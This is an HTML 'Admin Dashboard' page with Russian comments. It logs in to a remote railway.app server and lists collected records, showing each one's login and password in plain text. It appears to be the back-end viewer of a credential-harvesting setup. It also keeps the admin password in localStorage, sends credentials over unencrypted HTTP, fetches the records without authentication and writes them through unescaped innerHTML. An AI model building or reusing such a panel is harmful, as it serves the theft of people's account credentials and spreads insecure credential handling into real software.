<!DOCTYPE html>
<html lang="ru">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Dashboard</title>
    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.16/dist/tailwind.min.css" rel="stylesheet">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/bcryptjs/2.4.3/bcrypt.min.js"></script>
    <!-- Убедись, что этот скрипт загружен первым -->
</head>

<body class="bg-gray-100 h-screen">
    <div class="container mx-auto p-8">
        <h1 class="text-3xl font-bold mb-6">Requests</h1>
        <div id="requests" class="space-y-4">
            <!-- Данные будут отображаться здесь -->
        </div>
    </div>

    <script>
        // Проверка логина и пароля, сохранённых в localStorage
        const login = localStorage.getItem('adminLogin');
        const password = localStorage.getItem('adminPass');

        if (!login || !password) {
            window.location.href = 'login.html';
        }

        async function loadRequests() {
            try {
                // Отправляем логин и пароль на сервер без хеширования
                const authResponse = await fetch('http://airy-enjoyment-production-16a0.up.railway.app/admin/login', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ login, password })  // Не хешируем пароль здесь, сервер сделает это
                });

                if (!authResponse.ok) {
                    throw new Error('Неверный логин или пароль');
                }

                // Если авторизация прошла успешно, загружаем заявки
                const response = await fetch('http://airy-enjoyment-production-16a0.up.railway.app/requests');
                if (!response.ok) {
                    throw new Error('Ошибка при загрузке заявок');
                }

                const requests = await response.json();

                const requestsContainer = document.getElementById('requests');
                requests.forEach(request => {
                    const requestElement = document.createElement('div');
                    requestElement.classList.add('bg-white', 'p-4', 'rounded-lg', 'shadow-md');
                    requestElement.innerHTML = `
                        <p><strong>Login:</strong> ${request.login}</p>
                        <p><strong>Password:</strong> ${request.pass}</p>
                    `;
                    requestsContainer.appendChild(requestElement);
                });
            } catch (error) {
                console.error('Ошибка:', error);
                alert('Доступ запрещён. Войдите заново.');
                localStorage.removeItem('adminLogin');
                localStorage.removeItem('adminPass');
                window.location.href = 'login.html';
            }
        }

        window.onload = loadRequests;
    </script>
</body>

</html>
